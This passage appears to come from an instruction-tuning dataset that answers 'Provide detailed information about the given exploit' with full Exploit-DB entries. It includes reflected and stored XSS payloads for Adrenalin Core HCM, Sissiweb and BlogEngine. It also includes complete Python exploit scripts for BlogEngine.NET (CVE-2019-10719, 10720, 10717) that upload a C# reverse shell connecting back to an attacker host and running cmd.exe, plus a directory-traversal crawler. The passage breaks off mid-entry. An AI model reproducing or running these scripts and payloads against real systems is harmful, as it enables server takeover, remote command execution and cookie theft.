            "Exploit": "# Exploit Title: Adrenalin Core HCM 5.4.0 - 'strAction' Reflected Cross-Site Scripting\n# Google Dork: NA\n# Date: 2018-09-06\n# Exploit Author: Rishu Ranjan (Cy83rl0gger)\n# Vendor Homepage: https://www.myadrenalin.com/\n# Software Link: https://www.myadrenalin.com/core-hcm/\n# Version: 5.4.0 (REQUIRED)\n# Tested on: NA\n# CVE : CVE-2018-12234\n# Type: webapps\n# Platform: Multiple\n\n# Description\n# ====================\n# A Reflected Cross Site Scripting (XSS) Vulnerability was discovered in Adrenalin Core HCM v5.4.0 of HRMS Software.\n# The user supplied input containing malicious JavaScript is echoed back as it is in JavaScript code in an HTML response.\n\n# URL\n# ====================\n\nhttps://<Host:port>/Adrenalin/flexiportal/GeneralInfo.aspx?strAction=Update0%22[Javascript code]22HRMS%22%29%2f%2f1\nhttps://<Host:port>/myadrenalin/flexiportal/GeneralInfo.aspx?strAction=Update11170%22%3balert(%22HRMS%22)%2f%2f155\n\nParameter\n====================\nstrAction\n\nAttack Type\n====================\nRemote\n\nCVE Impact Other\n====================\nAllows an attacker to input malicious JavaScript which can steal cookie, redirect them to other malicious website, etc.\n\nReference\n====================\nhttps://nvd.nist.gov/vuln/detail/CVE-2018-12234\nhttps://www.knowcybersec.com/2018/09/first-cve-2018-12234-reflected-XSS.html\n\nDiscoverer\n====================\nRishu Ranjan"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 45668",
        "output": {
            "ID": "45668",
            "File": "exploits/aspx/webapps/45668.txt",
            "Description": "Axioscloud Sissiweb Registro Elettronico 7.0.0 - 'Error_desc' Cross-Site Scripting",
            "Date Published": "2018-10-24",
            "Author": "Dino Barlattani",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2018-10-24",
            "Date Updated": "2018-10-24",
            "Verified": "0",
            "Codes": [
                "CVE-2018-18437"
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Axioscloud Sissiweb Registro Elettronico 7.0.0 - 'Error_desc' Cross-Site Scripting\n# Dork: n/a\n# Date: 2018-10-11\n# Exploit Author: Dino Barlattani\n# Vendor Homepage: http://axiositalia.it/\n# Software Link: http://axiositalia.it/?page_id=1907\n# Version: 1.7.0/7.0.0\n# Category: Webapps\n# Platform: ASPX\n# CVE: N/A\n\n# POC:\n# https://family.axioscloud.it/secret/relogoff.aspx?Error_Desc=Sessione%20non%20Validaa%3Cbody%20onload=%22alert(%27ok%27);%22%3E&Error_Parameters="
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48999",
        "output": {
            "ID": "48999",
            "File": "exploits/aspx/webapps/48999.txt",
            "Description": "BlogEngine 3.3.8 - 'Content' Stored XSS",
            "Date Published": "2020-11-06",
            "Author": "Andrey Stoykov",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2020-11-06",
            "Date Updated": "2020-11-06",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: BlogEngine 3.3.8 - 'Content' Stored XSS\n# Date: 11/2020\n# Exploit Author: Andrey Stoykov\n# Vendor Homepage: https://blogengine.io/\n# Software Link: https://github.com/BlogEngine/BlogEngine.NET/releases/download/v3.3.8.0/3380.zip\n# Version: 3.3.8\n# Tested on: Windows Server 2016\n# Exploit and Detailed Info: https://infosecresearchlab.blogspot.com/2020/11/blogengine-338-stored-xss.html\n\n\nStored XSS Reproduction Steps:\n\n1. Login http://IP/blogengine/admin/app/editor/editpost.cshtml\n2. Add content and trap POST request into intercepting proxy\n3. Add the XSS payload into the \"Content\" parameter value\n4. Browse to the post to trigger the XSS payload\n\n\nExample HTTP POST Request:\nPOST /blogengine/api/posts HTTP/1.1\nHost: 192.168.56.6\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\n[..]\n{\n  \"Id\": \"\",\n  \"Title\": \"XSS Test\",\n  \"Author\": \"Admin\",\n  \"Content\": \"<img src=x onerror=alert(`XSS`)>\",\n  [..]\n  }\n\nExample HTTP Response:\nHTTP/1.1 201 Created\nCache-Control: no-cache\n[..]\n{\n  \"IsChecked\": false,\n  \"Id\": \"357ae13d-f230-486a-b2aa-71d67a700083\",\n  \"Title\": \"XSS Test\",\n  \"Author\": \"Admin\",\n  \"Description\": \"\",\n  \"Content\": \"<img src=x onerror=alert(`XSS`)>\",\n  [..]\n }"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47010",
        "output": {
            "ID": "47010",
            "File": "exploits/aspx/webapps/47010.py",
            "Description": "BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution",
            "Date Published": "2019-06-19",
            "Author": "Aaron Bishop",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-06-19",
            "Date Updated": "2019-06-19",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Directory Traversal + RCE on BlogEngine.NET\n# Date: 17 Jun 2019\n# Exploit Author: Aaron Bishop\n# Vendor Homepage: https://blogengine.io/\n# Version: v3.3.7\n# Tested on: 3.3.7, 3.3.6\n# CVE : 2019-10719\n\n#1. Description\n#==============\n\n#BlogEngine.NET is vulnerable to an Directory Traversal on `/api/upload` which allows a RCE through the `theme` parameter.\n\n#2. Proof of Concept\n#=============\n\n#Using an account that has permissions to Edit Posts, upload a malicious file called `PostView.ascx`; exploit the directory traversal to upload the shell into the **/Custom/Themes** #directory:\n\n#~~~\n#POST /api/upload?action=filemgr&dirPath=%2f..%2f..%2fCustom%2fThemes%2fRCE_Test HTTP/1.1\n#Host: $RHOST\n#User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\n#Accept: text/plain\n#Accept-Language: en-US,en;q=0.5\n#Accept-Encoding: gzip, deflate\n#Cookie: XXX\n#Connection: close\n#Content-Type: multipart/form-data; boundary=---------------------------12143974373743678091868871063\n#Content-Length: 2085\n\n#-----------------------------12143974373743678091868871063\n#Content-Disposition: form-data; filename=\"PostView.ascx\"\n\n#<%@ Control Language=\"C#\" AutoEventWireup=\"true\" EnableViewState=\"false\" Inherits=\"BlogEngine.Core.Web.Controls.PostViewBase\" %>\n#<%@ Import Namespace=\"BlogEngine.Core\" %>\n\n#<script runat=\"server\">\n#static System.IO.StreamWriter streamWriter;\n\n#    protected override void OnLoad(EventArgs e) {\n#        base.OnLoad(e);\n\n#using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(\"$LHOST\", 4445)) {\n#using(System.IO.Stream stream = client.GetStream()) {\n#using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {\n#streamWriter = new System.IO.StreamWriter(stream);\n\n#StringBuilder strInput = new StringBuilder();\n\n#System.Diagnostics.Process p = new System.Diagnostics.Process();\n#p.StartInfo.FileName = \"cmd.exe\";\n#p.StartInfo.CreateNoWindow = true;\n#p.StartInfo.UseShellExecute = false;\n#p.StartInfo.RedirectStandardOutput = true;\n#p.StartInfo.RedirectStandardInput = true;\n#p.StartInfo.RedirectStandardError = true;\n#p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);\n#p.Start();\n#p.BeginOutputReadLine();\n\n#while(true) {\n#strInput.Append(rdr.ReadLine());\n#p.StandardInput.WriteLine(strInput);\n#strInput.Remove(0, strInput.Length);\n#    } } } } }\n\n#    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {\n#  StringBuilder strOutput = new StringBuilder();\n\n#        if (!String.IsNullOrEmpty(outLine.Data)) {\n#        try {\n#                strOutput.Append(outLine.Data);\n#                    streamWriter.WriteLine(strOutput);\n#                    streamWriter.Flush();\n#} catch (Exception err) { }\n#       }\n#    }\n#</script>\n#<asp:PlaceHolder ID=\"phContent\" runat=\"server\" EnableViewState=\"false\"></asp:PlaceHolder>\n\n#-----------------------------12143974373743678091868871063--\n#~~~\n\n#The RCE can be triggered by setting the **theme** parameter to **RCE_TEST**: $RHOST/?theme=RCE_Test\n\n#==============================\n\nimport argparse\nimport io\nimport json\nimport os\nimport re\nimport requests\nimport sys\n\n\"\"\"\nExploit for CVE-2019-10719\n\nCVE Identified by: Aaron Bishop\nExploit written by: Aaron Bishop\n\nUpload and trigger a reverse shell\n\npython exploit.py -t 192.168.10.9 -l 192.168.10.10:1337\n\nOpen a listener to capture the reverse shell - Metasploit or netcat\n\nnc -nlvp 1337\nlistening on [any] 1337 ...\nconnect to [192.168.10.10] from (UNKNOWN) [192.168.10.9] 49680\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\n\"\"\"\n\nurls = {\n        \"login\": \"/Account/login.aspx\",\n        \"traversal\": \"/api/filemanager\"\n       }\n\n\ndef make_request(session, method, target, params={}, data={}, files={}):\n    proxies = {\n            \"http\": \"127.0.0.1:8080\",\n            \"https\": \"127.0.0.1:8080\"\n              }\n    if method == 'GET':\n        r = requests.Request(method, target, params=params)\n    elif method == 'POST':\n        if files:\n            r = requests.Request(method, target, files=files)\n        else:\n            r = requests.Request(method, target, data=data)\n    prep = session.prepare_request(r)\n    resp = session.send(prep, verify=False, proxies=proxies)\n    return resp.text\n\ndef login(session, host, user, passwd):\n    resp = make_request(session, 'GET', host+urls.get('login'))\n    login_form = re.findall('<input\\s+.*?name=\"(?P<name>.*?)\"\\s+.*?(?P<tag>\\s+value=\"(?P<value>.*)\")?\\s/>', resp)\n    login_data = dict([(i[0],i[2]) for i in login_form])\n    login_data.update({'ctl00$MainContent$LoginUser$UserName': user})\n    login_data.update({'ctl00$MainContent$LoginUser$Password': passwd})\n    resp = make_request(session, 'POST', host+urls.get('login'), data=login_data)\n\ndef upload_shell(session, target, shell_dir, listener):\n    try:\n        lhost, lport = listener.split(':')\n    except:\n       print(target, \" is not in the correct HOST:PORT format\")\n       sys.exit(1)\n\n    shell = '''<%@ Control Language=\"C#\" AutoEventWireup=\"true\" EnableViewState=\"false\" Inherits=\"BlogEngine.Core.Web.Controls.PostViewBase\" %>\n<%@ Import Namespace=\"BlogEngine.Core\" %>\n\n<script runat=\"server\">\n\tstatic System.IO.StreamWriter streamWriter;\n\n    protected override void OnLoad(EventArgs e) {\n        base.OnLoad(e);\n\n\tusing(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(\"''' + lhost + '''\", ''' + lport + ''')) {\n\t\tusing(System.IO.Stream stream = client.GetStream()) {\n\t\t\tusing(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {\n\t\t\t\tstreamWriter = new System.IO.StreamWriter(stream);\n\n\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\tSystem.Diagnostics.Process p = new System.Diagnostics.Process();\n\t\t\t\tp.StartInfo.FileName = \"cmd.exe\";\n\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\tp.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\tp.Start();\n\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\twhile(true) {\n\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n    \t}\n    }\n\n    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {\n   \tStringBuilder strOutput = new StringBuilder();\n\n       \tif (!String.IsNullOrEmpty(outLine.Data)) {\n       \t\ttry {\n                \tstrOutput.Append(outLine.Data);\n                    \tstreamWriter.WriteLine(strOutput);\n                    \tstreamWriter.Flush();\n                } catch (Exception err) { }\n        }\n    }\n\n</script>\n<asp:PlaceHolder ID=\"phContent\" runat=\"server\" EnableViewState=\"false\"></asp:PlaceHolder>\n'''\n    make_request(session, \"POST\", target + \"/api/upload?action=filemgr&dirPath=~/App_Data/files/../../Custom/Themes/\" + shell_dir, files={\"file\": (\"PostView.ascx\".format(shell_dir=shell_dir), shell, \"application/octet-stream\")})\n\ndef trigger_shell(session, target, shell_dir):\n    make_request(session, \"GET\", target + \"/\", params={\"theme\": shell_dir})\n\ndef main(target, user, passwd, shell_dir, listener):\n    with requests.Session() as session:\n        login(session, target, user, passwd)\n        upload_shell(session, target, shell_dir, listener)\n        trigger_shell(session, target, shell_dir)\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description='Exploit CVE-2019-10719 Path traversal + RCE')\n    parser.add_argument('-t', '--target', action=\"store\", dest=\"target\", required=True, help='Target host')\n    parser.add_argument('-u', '--user', default=\"admin\", action=\"store\", dest=\"user\", help='Account with file upload permissions on blog')\n    parser.add_argument('-p', '--passwd', default=\"admin\", action=\"store\", dest=\"passwd\", help='Password for account')\n    parser.add_argument('-d', '--dir', nargs='?', default=\"RCE\", help='Theme Directory to write Reverse shell too')\n    parser.add_argument('-s', '--ssl', action=\"store_true\", help=\"Force SSL\")\n    parser.add_argument('-l', '--listener', action=\"store\", help=\"Host:Port combination reverse shell should back to - 192.168.10.10:1337\")\n    args = parser.parse_args()\n\n    protocol = \"https://\" if args.ssl else \"http://\"\n    main(protocol + args.target, args.user, args.passwd, args.dir, args.listener)"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47035",
        "output": {
            "ID": "47035",
            "File": "exploits/aspx/webapps/47035.py",
            "Description": "BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal",
            "Date Published": "2019-06-25",
            "Author": "Aaron Bishop",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-06-25",
            "Date Updated": "2019-07-03",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Traversal"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.com3360.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: Directory Traversal on BlogEngine.NET\n# Date: 24 Jun 2019\n# Exploit Author: Aaron Bishop\n# Vendor Homepage: https://blogengine.io/\n# Version: v3.3.7\n# Tested on: 3.3.7, 3.3.6\n# CVE : 2019-10717\n\n1. Description\n==============\n\nBlogEngine.NET is vulnerable to a directory traversal.  The page parameter, passed to /api/filemanager, reveals the contents of the directory.\n\n2. Proof of Concept\n=============\n\nLog in to the application and submit a GET request to /api/filemanager:\n\nRequest:\n\n~~~\nGET /api/filemanager?path=/../../ HTTP/1.1\nHost: $RHOST\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: $COOKIE\nConnection: close\nUpgrade-Insecure-Requests: 1\n~~~\n\nDepending on how the request is submitted, the response may be XML or JSON\n\nXML Response\n\n~~~\nHTTP/1.1 200 OK\nCache-Control: no-cache\nPragma: no-cache\nContent-Type: application/xml; charset=utf-8\nExpires: -1\nServer: Microsoft-IIS/8.5\nX-Powered-By: ASP.NET\nDate: Wed, 15 May 2019 01:58:46 GMT\nConnection: close\nContent-Length: 13030\n\n<ArrayOfFileInstance xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://schemas.datacontract.org/2004/07/BlogEngine.Core.FileSystem\">\n<FileInstance>\n    <Created>5/14/2019 6:58:46 PM</Created>\n    <FileSize></FileSize>\n    <FileType>Directory</FileType>\n    <FullPath>~/App_Data/files/../..</FullPath>\n    <IsChecked>false</IsChecked>\n    <Name>...</Name>\n    <SortOrder>0</SortOrder>\n</FileInstance>\n...\n~~~\n\nJSON Response\n\n~~~\nHTTP/1.1 200 OK\nCache-Control: no-cache\nPragma: no-cache\nContent-Type: application/json; charset=utf-8\nExpires: -1\nServer: Microsoft-IIS/8.5\nX-Powered-By: ASP.NET\nDate: Wed, 15 May 2019 02:35:13 GMT\nConnection: close\nContent-Length: 10011\n\n[\n    {\n        \"IsChecked\":false,\n        \"SortOrder\":0,\n        \"Created\":\"5/14/2019 7:35:13 PM\",\n        \"Name\":\"...\",\n        \"FileSize\":\"\",\n        \"FileType\":0,\n        \"FullPath\":\"~/App_Data/files/../..\",\n        \"ImgPlaceholder\":\"\"\n    }\n...\n~~~\n\nimport argparse\nimport json\nimport os\nimport re\nimport requests\nimport sys\n\n\"\"\"\nExploit for CVE-2019-10717\n\nCVE Identified by: Aaron Bishop\nExploit written by: Aaron Bishop\n\nOutputs list of filenames found in web root\n\npython exploit.py -t $RHOST\n\n?path=/../..\n/../../archive.aspx\n/../../archive.aspx.cs\n/../../archive.aspx.designer.cs\n/../../BlogEngine.NET.csproj\n/../../BlogEngine.NET.csproj.user\n/../../contact.aspx\n/../../contact.aspx.cs\n/../../contact.aspx.designer.cs\n\"\"\"\n\nurls = {\n        \"login\": \"/Account/login.aspx\",\n        \"traversal\": \"/api/filemanager\"\n       }\n\ndef make_request(session, method, target, data={}):\n    proxies = {\n            \"http\": \"127.0.0.1:8080\",\n            \"https\": \"127.0.0.1:8080\"\n              }\n    if method == 'GET':\n        r = requests.Request(method, target, params=data)\n    elif method == 'POST':\n        r = requests.Request(method, target, data=data)\n    prep = session.prepare_request(r)\n    resp = session.send(prep, verify=False, proxies=proxies)\n    return resp.text\n\ndef login(session, host, user, passwd):\n    resp = make_request(session, 'GET', host+urls.get('login'))\n    login_form = re.findall('<input\\s+.*?name=\"(?P<name>.*?)\"\\s+.*?(?P<tag>\\s+value=\"(?P<value>.*)\")?\\s/>', resp)\n    login_data = dict([(i[0],i[2]) for i in login_form])\n    login_data.update({'ctl00$MainContent$LoginUser$UserName': user})\n    login_data.update({'ctl00$MainContent$LoginUser$Password': passwd})\n    resp = make_request(session, 'POST', host+urls.get('login'), login_data)\n\ndef parse(body, path, outfile):\n    paths = json.loads(body)\n    new_paths = set()\n    for i in paths:\n        if i.get('FileType') == 0:\n            new_paths.add(i.get('FullPath'))\n        else:\n            outfile.write(\"{path}\\n\".format(path=i.get('FullPath')))\n    return new_paths\n\ndef traverse(session, host, paths, outfile, visited=set()):\n    paths = set(paths) - visited\n    for path in paths:\n        print path\n        outfile.write(\"\\n?path={path}\\n\".format(path=path))\n        visited.add(path)\n        resp = make_request(session, 'GET', host+urls.get('traversal'), data=dict(path=path))\n        new_paths = parse(resp, path, outfile)\n        if new_paths:\n            traverse(session, host, new_paths, outfile, visited)\n\ndef main(host, user, passwd, root, outfile):\n    with requests.Session() as s:\n        login(s, host, user, passwd)\n        traverse(s, host, root, outfile)\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description='Exploit CVE-2019-10717 Path traversal')\n    parser.add_argument('-t', '--target', action=\"store\", dest=\"target\", required=True, help='Target host')\n    parser.add_argument('-u', '--user', default=\"admin\", action=\"store\", dest=\"user\", help='Account on blog')\n    parser.add_argument('-p', '--passwd', default=\"admin\", action=\"store\", dest=\"passwd\", help='Password for account')\n    parser.add_argument('-r', '--root', nargs='+', default=\"/../..\", help='Starting paths')\n    parser.add_argument('-s', '--ssl', action=\"store_true\", help=\"Force SSL\")\n    parser.add_argument('-o', '--outfile', type=argparse.FileType('w'), default='CVE-2019-10717.txt')\n    args = parser.parse_args()\n\n    protocol = \"https://\" if args.ssl else \"http://\"\n    if isinstance(args.root, str):\n        args.root = [args.root]\n    main(protocol + args.target, args.user, args.passwd, args.root, args.outfile)"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47011",
        "output": {
            "ID": "47011",
            "File": "exploits/aspx/webapps/47011.py",
            "Description": "BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution",
            "Date Published": "2019-06-19",
            "Author": "Aaron Bishop",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-06-19",
            "Date Updated": "2019-06-19",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Directory Traversal + RCE on BlogEngine.NET\n# Date: 17 Jun 2019\n# Exploit Author: Aaron Bishop\n# Vendor Homepage: https://blogengine.io/\n# Version: v3.3.7\n# Tested on: 3.3.7, 3.3.6\n# CVE : 2019-10720\n\n#1. Description\n#==============\n\n#BlogEngine.NET is vulnerable to a Directory Traversal through the **theme** cookie which triggers a RCE.\n\n#2. Proof of Concept\n#=============\n\n#Using an account that has permissions to Edit Posts, upload a malicious file called `PostView.ascx`:\n\n#~~~\n#POST /api/upload?action=filemgr HTTP/1.1\n#Host: $RHOST\n#User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\n#Accept: text/plain\n#Accept-Language: en-US,en;q=0.5\n#Accept-Encoding: gzip, deflate\n#Cookie: XXX\n#Connection: close\n#Content-Type: multipart/form-data; boundary=---------------------------12143974373743678091868871063\n#Content-Length: 2085\n\n#-----------------------------12143974373743678091868871063\n#Content-Disposition: form-data; filename=\"PostView.ascx\"\n\n#<%@ Control Language=\"C#\" AutoEventWireup=\"true\" EnableViewState=\"false\" Inherits=\"BlogEngine.Core.Web.Controls.PostViewBase\" %>\n#<%@ Import Namespace=\"BlogEngine.Core\" %>\n\n#<script runat=\"server\">\n#static System.IO.StreamWriter streamWriter;\n\n#    protected override void OnLoad(EventArgs e) {\n#        base.OnLoad(e);\n\n#using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(\"$LHOST\", 4445)) {\n#using(System.IO.Stream stream = client.GetStream()) {\n#using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {\n#streamWriter = new System.IO.StreamWriter(stream);\n\n#StringBuilder strInput = new StringBuilder();\n\n#System.Diagnostics.Process p = new System.Diagnostics.Process();\n#p.StartInfo.FileName = \"cmd.exe\";\n#p.StartInfo.CreateNoWindow = true;\n#p.StartInfo.UseShellExecute = false;\n#p.StartInfo.RedirectStandardOutput = true;\n#p.StartInfo.RedirectStandardInput = true;\n#p.StartInfo.RedirectStandardError = true;\n#p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);\n#p.Start();\n#p.BeginOutputReadLine();\n\n#while(true) {\n#strInput.Append(rdr.ReadLine());\n#p.StandardInput.WriteLine(strInput);\n#strInput.Remove(0, strInput.Length);\n#    } } } } }\n\n#    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {\n#  StringBuilder strOutput = new StringBuilder();\n\n#        if (!String.IsNullOrEmpty(outLine.Data)) {\n#        try {\n#                strOutput.Append(outLine.Data);\n#                    streamWriter.WriteLine(strOutput);\n#                    streamWriter.Flush();\n#} catch (Exception err) { }\n#        }\n#    }\n#</script>\n#<asp:PlaceHolder ID=\"phContent\" runat=\"server\" EnableViewState=\"false\"></asp:PlaceHolder>\n\n#-----------------------------12143974373743678091868871063--\n#~~~\n\n#Trigger the RCE by setting the **theme** cookie to **../../App_Data/files/2019/06/** and browsing to any page on the application; authentication is not required to trigger the RCE.\n=================================\n\nimport argparse\nimport io\nimport json\nimport os\nimport re\nimport requests\nimport sys\n\n\"\"\"\nExploit for CVE-2019-10719\n\nCVE Identified by: Aaron Bishop\nExploit written by: Aaron Bishop\n\nUpload and trigger a reverse shell\n\npython exploit.py -t 192.168.10.9 -l 192.168.10.10:1337\n\nOpen a listener to capture the reverse shell - Metasploit or netcat\n\nnc -nlvp 1337\nlistening on [any] 1337 ...\nconnect to [192.168.10.10] from (UNKNOWN) [192.168.10.9] 49680\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\n\"\"\"\n\nurls = {\n        \"login\": \"/Account/login.aspx\",\n        \"traversal\": \"/api/filemanager\"\n       }\n\n\ndef make_request(session, method, target, params={}, data={}, files={}):\n    proxies = {\n            \"http\": \"127.0.0.1:8080\",\n            \"https\": \"127.0.0.1:8080\"\n              }\n    if method == 'GET':\n        r = requests.Request(method, target, params=params)\n    elif method == 'POST':\n        if files:\n            r = requests.Request(method, target, files=files)\n        else:\n            r = requests.Request(method, target, data=data)\n    prep = session.prepare_request(r)\n    resp = session.send(prep, verify=False, proxies=proxies)\n    return resp.text\n\ndef login(session, host, user, passwd):\n    resp = make_request(session, 'GET', host+urls.get('login'))\n    login_form = re.findall('<input\\s+.*?name=\"(?P<name>.*?)\"\\s+.*?(?P<tag>\\s+value=\"(?P<value>.*)\")?\\s/>', resp)\n    login_data = dict([(i[0],i[2]) for i in login_form])\n    login_data.update({'ctl00$MainContent$LoginUser$UserName': user})\n    login_data.update({'ctl00$MainContent$LoginUser$Password': passwd})\n    resp = make_request(session, 'POST', host+urls.get('login'), data=login_data)\n\ndef upload_shell(session, target, listener):\n    try:\n        lhost, lport = listener.split(':')\n    except:\n       print(target, \" is not in the correct HOST:PORT format\")\n       sys.exit(1)\n\n    shell = '''<%@ Control Language=\"C#\" AutoEventWireup=\"true\" EnableViewState=\"false\" Inherits=\"BlogEngine.Core.Web.Controls.PostViewBase\" %>\n<%@ Import Namespace=\"BlogEngine.Core\" %>\n\n<script runat=\"server\">\n\tstatic System.IO.StreamWriter streamWriter;\n\n    protected override void OnLoad(EventArgs e) {\n        base.OnLoad(e);\n\n\tusing(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(\"''' + lhost + '''\", ''' + lport + ''')) {\n\t\tusing(System.IO.Stream stream = client.GetStream()) {\n\t\t\tusing(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {\n\t\t\t\tstreamWriter = new System.IO.StreamWriter(stream);\n\n\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\tSystem.Diagnostics.Process p = new System.Diagnostics.Process();\n\t\t\t\tp.StartInfo.FileName = \"cmd.exe\";\n\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\tp.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\tp.Start();\n\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\twhile(true) {\n\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n    \t}\n    }\n\n    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {\n   \tStringBuilder strOutput = new StringBuilder();\n\n       \tif (!String.IsNullOrEmpty(outLine.Data)) {\n       \t\ttry {\n                \tstrOutput.Append(outLine.Data);\n                    \tstreamWriter.WriteLine(strOutput);\n                    \tstreamWriter.Flush();\n                } catch (Exception err) { }\n        }\n    }\n\n</script>\n<asp:PlaceHolder ID=\"phContent\" runat=\"server\" EnableViewState=\"false\"></asp:PlaceHolder>\n'''\n    make_request(session, \"POST\", target + \"/api/upload?action=filemgr\", files={\"file\": (\"PostView.ascx\", shell, \"application/octet-stream\")})\n\ndef trigger_shell(session, target):\n    import datetime\n    now = datetime.datetime.now().strftime(\"%Y/%m/\")\n    requests.get(target + \"/\", cookies={\"theme\": \"../../App_Data/files/{}\".format(now)})\n\ndef main(target, user, passwd, listener):\n    with requests.Session() as session:\n        login(session, target, user, passwd)\n        upload_shell(session, target, listener)\n        trigger_shell(session, target)\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description='Exploit CVE-2019-10720 Path traversal + RCE')\n    parser.add_argument('-t', '--target', action=\"store\", dest=\"target\", required=True, help='Target host')\n    parser.add_argument('-u', '--user', default=\"admin\", action=\"store\", dest=\"user\", help='Account with file upload permissions on blog')\n    parser.add_argument('-p', '--passwd', default=\"admin\", action=\"store\", dest=\"passwd\", help='Password for account')\n    parser.add_argument('-s', '--ssl', action=\"store_true\", help=\"Force SSL\")\n    parser.add_argument('-l', '--listener', action=\"store\", help=\"Host:Port combination reverse shell should back to - 192.168.10.10:1337\")\n    args = parser.parse_args()\n\n    protocol = \"https://\" if args.ssl else \"http://\"\n    main(protocol + args.target, args.user, args.passwd, args.listener)"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47014",
        "output": {
            "ID": "47014",
            "File": "exploits/aspx/webapps/47014.py",
            "Description": "BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection",
            "Date Published": "2019-06-20",
            "Author": "Aaron Bishop",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-06-20",
            "Date Updated": "2019-06-20",
            "Verified": "0",
            "Codes": [
                ""
            ],
